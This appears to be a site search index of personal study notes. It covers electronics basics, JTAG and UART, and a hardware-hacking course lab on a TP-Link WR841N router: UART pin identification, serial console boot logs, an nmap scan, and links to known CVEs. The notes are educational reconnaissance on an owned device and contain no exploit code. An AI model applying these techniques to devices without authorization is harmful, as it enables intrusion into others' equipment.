the\u00a0Marketplace. Select an extension tile below to read the description and reviews to decide which extension is best for you.</p> <ul> <li>Python</li> <li>C C++</li> <li>C#</li> <li>Go</li> <li>Dart</li> <li>PHP</li> <li>Ruby LSP</li> </ul>"},{"location":"Knowledge_Base/Coding_%26_Scripting/vsCode/#linux-installation","title":"Linux Installation","text":"<ul> <li>Visual Studio Code on Linux</li> <li>Download Visual Studio Code</li> </ul>"},{"location":"Knowledge_Base/Coding_%26_Scripting/vsCode/#ubuntu-install","title":"Ubuntu install","text":"<p>Download the .deb package from Here</p> <pre><code>#modify permissions on the .deb file\nchmod +x code_*.deb\n\n#install the package\nsudo dpkg -i code_*.deb\n</code></pre>"},{"location":"Knowledge_Base/Cyber_Journey/CRYPTOHACK/CRYPTOHACK/","title":"CRYPTOHACK","text":"<p>CryptoHack</p>"},{"location":"Knowledge_Base/Cyber_Journey/HTB_HackTheBox/HTB/","title":"HTB","text":""},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/","title":"Hardware Hacking","text":"<p>https://www.sciencebuddies.org/science-fair-projects/references/how-to-use-a-breadboard#name-breadboard</p> <ul> <li>Breadboard (\"solderless\" breadboard) &amp; Through-hole circuit board</li> <li>Jumper wire kits https://www.jameco.com/webapp/wcs/stores/servlet/Product_10001_10001_2150467_-1</li> <li>LEDs have a positive side (called the anode) and a negative side (called the cathode)</li> <li>Diodes are like one-way valves that only let electricity flow in one direction</li> <li>Capacitors are components that can store electrical charge</li> <li> <p>Transistors are like electronically controlled switches</p> </li> <li> <p>short circuits</p> </li> <li> <p>multimeter</p> </li> <li> <p>Integrated circuits (ICs)     Many ICs come in something called a dual in-line package, or DIP, meaning they have two parallel rows of pins.     If you want to connect a chip, you need to connect it across the gap in the middle of the breadboard</p> </li> <li> <p>Circuit diagrams, or schematics</p> </li> <li> <p>Through-hole vs. surface mount parts     Breadboards are designed to work with through-hole electronic components. These components have long metal leads that are designed to be inserted through holes in a printed circuit board (PCB) that are plated with a thin copper coating, which allows the components' leads to be soldered to the board.     Breadboards do not work with surface mount components. These components have short, flat pins on their sides that are designed to be soldered to the surface of a printed circuit board, instead of through holes.</p> </li> </ul> <p>https://learn.sparkfun.com/tutorials/voltage-current-resistance-and-ohms-law</p> <p>Info</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#choose-a-power-supply","title":"Choose A Power Supply","text":""},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#question-i-have-a-3a-power-supply-will-it-break-my-500ma-circuit","title":"Question: I have a 3A power supply, will it break my 500mA circuit?","text":"<p>No. A 3A power supply will not force 3A into your circuit. A 3A power supply will supply up to 3A of current. It\u2019s your circuit that decides how much of that current it will actually use.</p> <p>(EDIT: Note that a power supply is not the same as a battery charger. Connecting a power supply with too much current directly to a battery could damage it)</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#question-my-device-says-5v-dc-1a-what-power-supply-do-i-need","title":"Question: My device says 5V (DC) 1A. What power supply do I need?","text":"<p>You need a power supply that gives 5V DC and has a maximum current of more than 1A.</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#question-my-circuit-needs-9v-can-i-use-my-12v-supply","title":"Question: My circuit needs 9V, can I use my 12V supply?","text":"<p>No. If your circuit needs 9V and you connect it to 12V, it\u2019s a good chance it will break.</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#gps","title":"GPS","text":"<p>https://www.sparkfun.com/gps https://www.adafruit.com/product/746    https://www.jameco.com/z/4279-Adafruit-Industries-Adafruit-Ultimate-Gps-Gnss-with-USB-99-Channel-with-10-Hz-Updates_2517871.html?srsltid=AfmBOorObxPJ1dGGtdoS7z6lGr9EZi3VcljR5XZxWJ-72yfe3WSIt6kaKD0 https://www.adafruit.com/product/4415 https://www.adafruit.com/product/4279</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#arduino-comparison","title":"Arduino comparison","text":"<p>https://www.sparkfun.com/standard_arduino_comparison_guide https://learn.sparkfun.com/tutorials/choosing-an-arduino-for-your-project</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#kit","title":"Kit","text":"<p>https://www.sparkfun.com/products/21301 https://store-usa.arduino.cc/products/arduino-education-starter-kit?pr_prod_strat=e5_desc&amp;pr_rec_id=cf6bc6233&amp;pr_rec_pid=6813188554959&amp;pr_ref_pid=6544108159183&amp;pr_seq=uniform https://store-usa.arduino.cc/products/arduino-replacements-pack?pr_prod_strat=jac&amp;pr_rec_id=40be2e783&amp;pr_rec_pid=6544223207631&amp;pr_ref_pid=6813188554959&amp;pr_seq=uniform</p> <p>https://docs.arduino.cc/hardware/mkr-gps-shield/?queryID=fdac64c9e30f82767feb97f95e285a8d https://www.arduino.cc/reference/en/libraries/arduino_mkrgps/ https://store-usa.arduino.cc/products/4g-module-global</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#sellers","title":"Sellers","text":"<p>https://novelda.com/ https://www.gilisymo.com/ https://jlcpcb.com/</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#projects","title":"Projects","text":"<p>https://steemit.com/utopian-io/@kimp0gi/interfacing-gsm-and-gps-module-using-arduino-a-step-by-step-guide-tutorial-for-tracking</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#project-research","title":"Project research","text":"<p>https://www.reddit.com/r/arduino/comments/19937aa/which_board_replaces_the_mkr_gsm_1400/?rdt=62824 https://codeberg.org/johan-m-o/BikeTracker</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#project-purchase-list","title":"Project Purchase list","text":"<p>https://www.sparkfun.com/products/23386 Uno R3 https://www.sparkfun.com/products/21301</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#important-references","title":"Important references","text":"<p>https://www.elecrow.com/wiki/?title=32u4_with_A7_GPRS/GSM</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#fix-it","title":"Fix it","text":"<p>https://www.youtube.com/watch?v=wkAp5x3Z_gc&amp;pp=ygUUbXVsdGltZXRlciB2b2x0bWV0ZXI%3D</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#multimeters-the-complete-guide","title":"Multimeters - The Complete Guide","text":"<p>https://www.youtube.com/watch?v=viitNbwrUMI</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#gps-modules-with-arduino-and-raspberry-pi","title":"GPS Modules with Arduino and Raspberry Pi","text":"<p>https://www.youtube.com/watch?v=kwk3qzaIcCU</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#must-buy","title":"MUST BUY","text":"<p>https://www.adafruit.com/product/4279 https://www.adafruit.com/product/851 https://www.adafruit.com/product/85 https://www.adafruit.com/product/3806 https://www.adafruit.com/product/3445 https://www.adafruit.com/product/2975</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#best-guide","title":"Best Guide","text":"<p>https://learn.adafruit.com/how-to-choose-a-microcontroller</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#jtag-joint-test-action-group-uart-universal-asynchronous-receiver-transmitter","title":"JTAG (Joint Test Action Group) &amp; UART (Universal Asynchronous Receiver / Transmitter)","text":""},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#jtag","title":"JTAG","text":""},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#interface-signals","title":"Interface Signals","text":"<p>The JTAG interface, collectively known as a Test Access Port, or TAP, uses the following signals to support the operation of boundary scan.</p> <ul> <li>TCK (Test Clock) \u2013 this signal synchronizes the internal state machine operations.</li> <li>TMS (Test Mode Select) \u2013 this signal is sampled at the rising edge of TCK to determine the next state.</li> <li>TDI (Test Data In) \u2013 this signal represents the data shifted into the device\u2019s test or programming logic. It is sampled at the rising edge of TCK when the internal state - machine is in the correct state.</li> <li>TDO (Test Data Out) \u2013 this signal represents the data shifted out of the device\u2019s test or programming logic and is valid on the falling edge of TCK when the internal - state machine is in the correct state.</li> <li>TRST (Test Reset) \u2013 this is an optional pin which, when available, can reset the TAP controller\u2019s state machine.</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#registers","title":"Registers","text":"<p>There are two types of registers associated with boundary scan. Each compliant device has one instruction register and two or more data registers.</p> <ul> <li> <p>Instruction Register \u2013 the instruction register holds the current instruction. Its content is used by the TAP controller to decide what to do with signals that are received. Most commonly, the content of the instruction register will define to which of the data registers signals should be passed.</p> </li> <li> <p>Data Registers \u2013 there are three primary data registers, the Boundary Scan Register (BSR), the BYPASS register and the IDCODES register. Other data registers may be present, but they are not required as part of the JTAG standard.</p> </li> <li> <p>BSR \u2013 this is the main testing data register. It is used to move data to and from the I/O pins of a device.</p> </li> <li>BYPASS \u2013 this is a single-bit register that passes information from TDI to TDO. It allows other devices in a circuit to be tested with minimal overhead.</li> <li>IDCODES \u2013 this register contains the ID code and revision number for the device. This information allows the device to be linked to its Boundary Scan Description Language (BSDL) file. The file contains details of the Boundary Scan configuration for the device.</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#test-access-port-tap-controller","title":"Test Access Port (TAP) Controller","text":"<p>The TAP controller, a state machine whose transitions are controlled by the TMS signal, controls the behaviour of the JTAG system. Figure 2, below, shows the state-transition diagram.</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#boundary-scan-instructions","title":"Boundary Scan Instructions","text":"<p>The IEEE 1149.1 standard defines a set of instructions that must be available for a device to be considered compliant. These instructions are:</p> <ul> <li>BYPASS \u2013 this instruction causes the TDI and TDO lines to be connected via a single-bit pass-through register (the BYPASS register). This instruction allows the testing of other devices in the JTAG chain without any unnecessary overhead.</li> <li>EXTEST \u2013 this instruction causes the TDI and TDO to be connected to the Boundary Scan Register (BSR). The device\u2019s pin states are sampled with the \u2018capture dr\u2019 JTAG state - and new values are shifted into the BSR with the \u2018shift dr\u2019 state; these values are then applied to the pins of the device using the \u2018update dr\u2019 state.</li> <li>SAMPLE/PRELOAD \u2013 this instruction causes the TDI and TDO to be connected to the BSR. However, the device is left in its normal functional mode. During this instruction, the BSR can be accessed by a data scan operation to take a sample of the functional data entering and leaving the device. The instruction is also used to preload test data into the BSR prior to loading an EXTEST instruction.</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#uart","title":"UART","text":""},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#communication-in-uart-can-be","title":"Communication in UART can be:","text":"<ul> <li>simplex (data is sent in one direction only)</li> <li>half-duplex (each side speaks but only one at a time)</li> <li>full-duplex (both sides can transmit simultaneously)</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#timing-and-synchronization-of-uart-protocols","title":"Timing and synchronization of UART protocols","text":"<ul> <li>UART is that is asynchronous, the transmitter and receiver do not share a common clock signal.</li> <li>Since they do not share a clock, both ends must transmit at the same, pre-arranged speed in order to have the same bit timing.</li> <li>The most common UART baud rates are 4800, 9600, 19.2K, 57.6K, and 115.2K.</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#uart-frame-format","title":"UART frame format","text":"<p>As with most digital systems - \u201chigh\u201d or \"mark\" voltage level is used to indicate a logical \u201c1\u201d - \u201clow\u201d or \"space\" voltage level is used to indicate a logical \u201c0\u201d</p> <p>Note that in the idle state (where no data is being transmitted), the line is held high. This allows an easy detection of a damaged line or transmitter.</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#start-and-stop-bits","title":"Start and stop bits","text":"<p>Because UART is asynchronous, the transmitter needs to signal that data bits are coming. This is accomplished by using the start bit. The start bit is a transition from the idle high state to a low state, and immediately followed by user data bits. After the data bits are finished, the stop bit indicates the end of user data. The stop bit is either a transition back to the high or idle state or remaining at the high state for an additional bit time. A second (optional) stop bit can be configured, usually to give the receiver time to get ready for the next frame, but this is uncommon in practice.</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#data-bits","title":"Data bits","text":"<p>The data bits are the user data or \u201cuseful\u201d bits and come immediately after the start bit. There can be 5 to 9 user data bits, although 7 or 8 bits is most common. These data bits are usually transmitted with the least significant bit first.</p> <p>Example If we want to send the capital letter \u201cS\u201d in 7-bit ASCII, the bit sequence is 1 0 1 0 0 1 1. We first reverse the order of the bits to put them in least significant bit order, that is 1 1 0 0 1 0 1, before sending them out. After the last data bit is sent, the stop bit is used to end the frame and the line returns to the idle state.</p> <p>7-bit ASCII \u2018S\u2019 (0x52) = 1 0 1 0 0 1 1 LSB order = 1 1 0 0 1 0 1</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#start-and-stop-bits_1","title":"Start and stop bits","text":""},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#data-bits_1","title":"Data bits","text":""},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#parity-bit","title":"Parity bit","text":"<p>A UART frame can also contain an optional parity bit that can be used for error detection. This bit is inserted between the end of the data bits and the stop bit. The value of the parity bit depends on the type of parity being used (even or odd):</p> <ul> <li>In even parity, this bit is set such that the total number of 1s in the frame will be even.</li> <li>In odd parity, this bit is set such that the total number of 1s in the frame will be odd.</li> </ul> <p>Example</p> <p>Capital \u201cS\u201d (1 0 1 0 0 1 1) contains a total of three zeros and 4 ones. If using even parity, the parity bit is zero because there already is an even number of ones. If using odd parity, then the parity bit has to be one in order to make the frame have an odd number of 1s.</p> <p>The parity bit can only detect a single flipped bit. If more than one bit is flipped, there\u2019s no way to reliably detect these using a single parity bit.</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#summary","title":"Summary","text":"<p>Asynchronous means no shared clock, so for UART to work, the same bit or baud rate must be configured on both sides of the connection. Start and stop bits are used to indicate where user data begins and ends, or to \u201cframe\u201d the data. An optional parity bit can be used to detect single bit errors. serial ports are almost always UART-based. Such as devices using RS-232 interfaces, external modems, etc.</p>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#soldering","title":"Soldering","text":""},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#resources","title":"Resources","text":"<ul> <li>Branchus Creations - Beginner's Guide to Soldering Electronics Part 3: Surface Mount Soldering</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#tools","title":"Tools","text":""},{"location":"Knowledge_Base/Cyber_Journey/Hardware_Hacking/Hardware_Hacking/#resources_1","title":"Resources","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/","title":"Beginners Guide to IoT and Hardware Hacking","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#section-0-course-introduction","title":"Section 0 - Course Introduction","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#required-equipment-and-tooling","title":"Required Equipment and Tooling","text":"<p>Product Links This document contains a list of the physical tools that are used throughout the lesson along with links to where the items can be purchased.</p> <p>I have selected these tools as the best balance of affordability and quality that I was able to find in an effort to keep this course as affordable as possible. I have tested all the tools linked and used them throughout the recording of this course. That being said, if you are interested in continuing with hardware hacking you may want to invest in more expensive tools, I'd encourage you to do so however I can only support and guarantee the lab activities will work with the tools in this list.</p> <p>I've split the list into two sections:</p> <p>Required for Hands-On Participation: These items are required at a minimum if you'd like to participate in all of the hands-on labs and activities in the course. Optional: These are items that I use or demonstrate in the course but are not required to follow along with the hands-on portions however they make things easier. Note that I've tried to add as much detail as possible about what each tool will be used for and if there are alternatives to purchasing.</p> <p>None of the links provided are affiliate links and I make no commission of off their sales.</p> <p>Required: Practice Target: TP-Link WR841n Wireless Router Where is this used: The router is used throughout almost the entire course as the practice target that we will be using for practicing taking measurements, sniffing communications and extracting firmware.</p> <p>Alternative to purchasing: If you are unable to or would prefer not to purchase this router then you won't be able to follow along with any of the hands-on measuring or testing, however, I'll make things like the analyzer captures available and you can download a copy of the firmware for analysis from the TP-Link website. With these files, you'll still be able to follow along with and complete all the portions of the course that rely on analyzing the captures and firmware. If you choose to not purchase the router then I'd suggest skipping the rest of the tools below as you'll need something to test or use the tools on.</p> <p>Links to Purchase:</p> <p>Link 1: https://www.tp-link.com/us/where-to-buy/</p> <p>Link 2: https://www.amazon.com/TP-Link-N300-Wireless-Wi-Fi-Router-TL-WR841N/dp/B001FWYGJS</p> <p>Number 1 Phillips Screw Driver Where is this used: Used to open the two retaining screws on the router.</p> <p>Alternative to purchasing: You'll need this to open the router, pretty much any Number 1, 0 or 00 Phillips screwdriver will work for this.</p> <p>Links to Purchase:</p> <p>Note - you don't need to purchase these specific ones - I'm only linking for convenience if you need to buy one. Use whatever ph1/ph0 screwdriver you prefer or have.</p> <p>Link to Jewellers Screw Driver Kit: https://www.amazon.com/Screwdriver-Eyeglass-Precision-Different-Screwdrivers/dp/B07YJG766F</p> <p>Number 1 Phillips Screwdriver: https://www.amazon.com/Wera-05118020001-Screwdriver-Electronic-Applications/dp/B0001P18LO</p> <p>UART to USB Adapter: CP2102 TTL USB to UART Adapter Where this is used: This tool is used to interface with the UART pins on the router and establish a serial shell connection.</p> <p>Alternative to purchasing: Unfortunately there is not a great alternative to purchasing this, if you'd prefer to skip this then you won't be able to follow along with any of the sessions where we use the serial shell to the router.</p> <p>Links to Purchase:</p> <p>Note that you'll see these devices sold in many different form factors and branding, any of the CP2102 TTL to USB should be sufficient however I've linked the one I used in the course below from a few different vendors.</p> <p>Link 1: https://www.amazon.com/IZOKEE-CP2102-Converter-Adapter-Downloader/dp/B07D6LLX19</p> <p>Link 2: https://www.amazon.com/HiLetgo-CP2102-Converter-Adapter-Downloader/dp/B00LODGRV8</p> <p>Link 3: https://www.amazon.com/CP2102-Serial-Adapter-Converter-Module/dp/B08ZS6H9VS</p> <p>Link 4: https://www.aliexpress.com/item/1005003536455256.html</p> <p>Male through-hole header pins Where this is used: These are used to enable a connection to the UART pins on the router. The router PCB has bare through-hole pads exposed for UART and in order to interface with them with the other tools we need to attach these header pins. A solderless option using these pins is demonstrated in the course.</p> <p>Alternative to purchasing: Unfortunately there is not a great alternative to purchasing this, luckily they are not expensive and are a great component to keep in your home lab. That being said, if you do purchase one of the ch341a programmers below many of them come with 4-pin headers for breakout additions and you could use one of those.</p> <p>Links to Purchase:</p> <p>Note these are pretty standard and you can grab them from any electronics shop. I've linked a few below.</p> <p>Link 1: https://www.amazon.com/Proto-Advantage-HDR100IMP40M-G-V-TH-Vertical-Header-Through/dp/B098KLMT7T</p> <p>Link 2: https://www.digikey.com/en/products/detail/w%C3%BCrth-elektronik/61300311121/4846825</p> <p>Link 3: https://www.mouser.com/ProductDetail/Chip-Quik/HDR100IMP40M-G-V-TH?qs=Wj%2FVkw3K%252BMBASWNGaQOKpg%3D%3D</p> <p>Digital Multimeter: AstroAI AM33D Multimeter 2000 Counts Digital Multimeter Where this is used: The multimeter is used throughout the course for testing and verification, in addition, most of section 2 of the course is dedicated to teaching how to use a multimeter and its various functions.</p> <p>Alternative to purchasing: If you don't purchase a multimeter then you won't be able to follow along with section 2 and a few of the additional verification steps in other lessons. While it's not advised, you could skip the verification steps using the multimeter and rely on the verification that I perform. I strongly discourage you from doing this though as the multimeter is your best tool in protecting your other equipment from being damaged by verifying voltage levels. It's also probably the most important tool in your hardware hacking toolkit moving forwards. If you would like to purchase another multimeter or already have one, any multimeter that can perform DC voltage reading and has a continuity tester setting will work.</p> <p>Links to Purchase:</p> <p>Link 1: https://www.amazon.com/AstroAI-Digital-Multimeter-Voltage-Tester/dp/B01ISAMUA6</p> <p>Link 2: https://www.astroai.com/digital-multimeter-2000-counts-am33d/ap/100071</p> <p>Logic Analyzer: Comidox USB Logic Analyzer Where this is used: The logic analyzer is used to sniff and capture both UART and SPI communications taking place on the router PCB.</p> <p>Alternative to purchasing: If you don't purchase the logic analyzer you can still do the majority of the lessons involving it as I will post links to the captures that I take and you will be able to then analyze them the same as if you took them yourself. If you're trying to save some money on tools to buy then this is one I'd recommend skipping.</p> <p>Links to purchase:</p> <p>Note that you can get these logic analyzers from multiple different manufacturers and they all look very similar and usually function identically with the only difference being the sticker applied to the top. The exact one I've used in the course is linked first.</p> <p>Link 1: https://www.amazon.com/Comidox-Analyzer-Device-Channel-Arduino/dp/B07KW445DJ</p> <p>Link 2: https://www.aliexpress.com/item/1005003375736481.html</p> <p>Link 3: https://www.amazon.com/HiLetgo-Analyzer-Ferrite-Channel-Arduino/dp/B077LSG5P2</p> <p>Flash ROM Programmer: ch341a USB Programmer Where this is used: The flash ROM programmer is used to extract the firmware from the device.</p> <p>Alternative to purchasing: If you don't purchase the flash programmer then you can use the firmware that is downloadable from the TP-Link support website for the router and use that instead to perform the firmware analysis.</p> <p>Links to purchase:</p> <p>Note that you can get these flash programmers from multiple different manufacturers and they all look very similar and usually function identically make sure you get one that uses the ch341a chip. I've linked below to the one that I used in the course.</p> <p>Link 1: https://www.amazon.com/KeeYees-SOIC8-EEPROM-CH341A-Programmer/dp/B07SHSL9X9</p> <p>Link 2: https://www.amazon.com/Geekstory-CH341A-EEPROM-Programmer-Module/dp/B098DYJ3LQ</p> <p>Link 3: https://www.aliexpress.com/item/32793476447.html</p> <p>Optional: Spudger Set Link: https://www.amazon.com/STREBITO-Spudger-Ultimate-Computer-Electronics/dp/B0BHPC2WB5</p> <p>Soldering Station: Weller WLC100 Link: https://www.amazon.com/Weller-Digital-Soldering-Station-WLC100/dp/B000AS28UC</p> <p>ESD Mat Link: https://www.amazon.ca/Anti-Static-Electronic-Wristband-Grounding-HPFIX/dp/B07X7VL7VR</p> <p>Third-Hand Link: https://www.amazon.com/Helping-Soldering-Workshop-Non-slip-Weighted/dp/B07MDKXNPC</p> <p>Test Clips Style 1 Link: https://www.amazon.com/Tegg-Electrical-Testing-Multimeter-Grabber/dp/B07NY73PQF</p> <p>Style 2 Link: https://www.amazon.com/Adapter-oscilloscope-multimeter-Generator-Programmer/dp/B07XNQ8CQW</p> <p>Extra Jumper Wires Link: https://www.amazon.com/Elegoo-EL-CP-004-Multicolored-Breadboard-arduino/dp/B01EV70C78</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#testing-notes","title":"Testing Notes","text":"<p>Target Information Manufacturer: TP-Link</p> <p>Part Number: TL-WR841N</p> <p>Serial Number: 22295L6001357</p> <p>Test-Equipment Multimeter: ASTRO AI AM33D</p> <p>Logic Analyzer: Comidox USB Logic Analyzer</p> <p>USB to UART Adapter: Silicon Labs CP210x UART Bridge</p> <p>Flash ROM Programmer: CH341a USB EPROM Programmer</p> <p>Software:</p> <p>Sigrok Pulsview (for logic captures) NMAP Firefox Screen Flashrom Binwalk DD (Data Duplicater) Ghidra Openssl Cyberchef Initial Recon Visual Inspection Inspected exterior of the router, and noted label on the back that contained FCC ID for further review.</p> <p>FCC ID: 2AXJ4WR841NV14</p> <p>Opened router case by removing two Phillips screws and applying pressure between pressure-fit parts with a spudger tool.</p> <p>Noted three chips of interest on the PCB for further inspection (shown as details A, B, and C in the picture below)</p> <p>On-board testing Noted the presence of a test connection that appears to be a UART connection based on the 4 pins labelled with VCC, GND, RX and TX (shown as detail D above)</p> <p>Verified operating voltage of the PCB is 9V by testing the voltage drop across the input jack with a multimeter.</p> <p>Identified ground connection on P1 (detail E above) by testing continuity with the ground connection on the input jack.</p> <p>Tested the suspected UART connection with a multimeter to verify pins matched the silk screen labels, each was pin tested as follows:</p> <p>VCC: Measured voltage drop between VCC and ground as 3.3V confirming operating voltage of UART at 3.3V GND: Checked for continuity between GND pin on UART and known ground on board and confirmed GND is in fact a ground. RX: Measured voltage drop between RX and ground as 0V, test to ensure it was not connected to ground by checking continuity between RX and known ground connections, no continuity found TX: Measured Voltage drop between RX and ground as ~3.3V during standard operation. After confirming pinout, based on the observations of the pins this appears to be a UART connection, checked for transmission on the TX pin during boot up by power cycling router and measuring voltage drop. Noted fluctuation on TX pin from ~1V - 3V suggests busy and active transmission during bootup.</p> <p>Soldered through hole inline header pins to suspected UART connection to facilitate further testing with a logic analyzer and later on USB to Serial Adapter.</p> <p>Attached Logic Analyzer to TX and GND pins of UART connection and captured a transmission during boot up, a screenshot of single transmission frame shown below.</p> <p>Manual framing of the signal confirmed a UART transmission, noted the start bit, 8 data bits, one stop bit and no parity bit.</p> <p>Measured the baud rate as 125,000 however based on standard serial baud rates suspect that it is actually 115,200.</p> <p>Based on these findings applied a UART decoder to the channel with the below settings.</p> <p>Decoded UART signal confirmed UART parameters and showed the presence of a boot loader and boot-up logs to be investigated further.</p> <p>OSINT and Online Recon Used previously located FCC ID to find FCC Equipment Authorization filing for the router (https://fccid.io/2AXJ4WR841NV14)</p> <p>Noted in the filing that the ID had been changed from the previous TE7WR841NV14.</p> <p>Inspecting the previous filing (https://fccid.io/TE7WR841NV14) internal photos of the router were located. Unfortunately, schematics, functional descriptions and block diagrams were redacted as confidential.</p> <p>Detailed pictures of two chips of interest were shown that detailed the chip manufacturer and part number.</p> <p>Previously denoted chip A Id'd as MEDIATEK MT7628NN</p> <p>Previously denoted chip B Id'd as Zentel A3S56D40GTP -50L</p> <p>Unfortunately, the markers on chip C were not readable in the FCC pictures. Returning to the test router, high-resolution pictures were taken and blown up to Id chip.</p> <p>Chip C was Id'd as cFeon QH32B-104HIP.</p> <p>Data sheets were located online for each of the chips.</p> <p>MEDIATEK MT7628NN: System On Chip (SOC) containing CPU. Important details included that this is a purpose-built SOC for N300 routers. The CPU is MIPS24KEc, which supports Linux 2.6.36 SDK and Linux 3.10 SDK. Interfaces with flash memory via SPI.</p> <p>Product Page: https://www.mediatek.com/products/home-networking/mt7628k-n-a</p> <p>Data Sheet: https://files.seeedstudio.com/products/114992470/MT7628_datasheet.pdf</p> <p>Zentel A3S56D40GTP -50L: DRAM 32Kb</p> <p>Data Sheet: https://www.mouser.ca/datasheet/2/1130/DSA3S56D340GTPF_02-1984099.pdf</p> <p>cFeon QH32B-104HIP: Id'd as full part number EN25Q32B-104HIP. Noted as Flash ROM that communicates via SPI.</p> <p>Data Sheet: https://www.alldatasheet.com/datasheet-pdf/pdf/675622/EON/EN25QH32A.html</p> <p>Searching for the firmware found it supplied through the official support page for the router.</p> <p>https://www.tp-link.com/ca/support/download/tl-wr841n/#Firmware</p> <p>Initial Network Recon Connected test computer to the network hosed by the router. Router IP address id'd as 192.168.0.1.</p> <p>Nmap scans were performed for both TCP and UDP.</p> <p>TCP scans revealed 3 open ports:</p> <p>Port 22 - ssh running Dropbear sshd 2012.55</p> <p>Port 80 - http hosting the routers configuration web portal</p> <p>Port 1900 - UPnP (Portable SDK for UPnP devices 1.6.19 (Linux 2.6.36))</p> <p>Notable detail confirmed the suspicion that the router is running Linux kernel 2.6.36.</p> <p>UDP scans revealed 2 open ports:</p> <p>Port 67/udp - dhcps</p> <p>Port 1900/udp - UPnP</p> <p>Scouting Previously Disclosed CVEs Scouted for previously disclosed and patched CVEs and multiple. Noted a common theme of a lack of proper user input validation on forms and inputs in the web portal that led to either buffer overflow or command injection of an underlying function or service being called.</p> <p>https://www.opencve.io/cve?vendor=tp-link&amp;product=tl-wr841n</p> <p>https://blog.viettelcybersecurity.com/1day-to-0day-on-tl-link-tl-wr841n/</p> <p>https://ktln2.org/2020/03/29/exploiting-mips-router/</p> <p>Enumeration via UART Connection Reviewing Bootlogs Connected USB to UART adapter to the previously located UART pins based on the below pinout:</p> <p>Opened Terminal Session via Screen with the previously identified baud rate.</p> <p>After powering on the router the bootloader logging and Linux initialization logging from init and init scripts were displayed over the serial console session:</p> <p>Command: screen /dev/ttyUSB0 115200</p> <p>[04080B0F][04080C0C][8A7F0000][26253B38][00262539] DU Setting Cal Done</p> <p>U-Boot 1.1.3 (Feb  3 2021 - 10:10:08)</p> <p>Board: Ralink APSoC DRAM:  32 MB relocate_code Pointer at: 81fc0000 flash manufacture id: 1c, device id 70 16 Warning: un-recognized chip ID, please update bootloader! ============================================ Ralink UBoot Version: 4.3.0.0</p> <p>ASIC 7628_MP (Port5&lt;-&gt;None) DRAM component: 256 Mbits DDR, width 16 DRAM bus: 16 bit Total memory: 32 MBytes Flash component: SPI Flash Date:Feb  3 2021  Time:10:10:08 ============================================ icache: sets:512, ways:4, linesz:32 ,total:65536 dcache: sets:256, ways:4, linesz:32 ,total:32768</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#the-cpu-freq-580-mhz","title":"The CPU freq = 580 MHZ","text":"<p>estimate memory size =32 Mbytes RESET MT7628 PHY!!!!!! continue to starting system.                                                                                                                                                                                                             0 disable switch phyport...</p> <p>3: System Boot system code via Flash.(0xbc010000) do_bootm:argc=2, 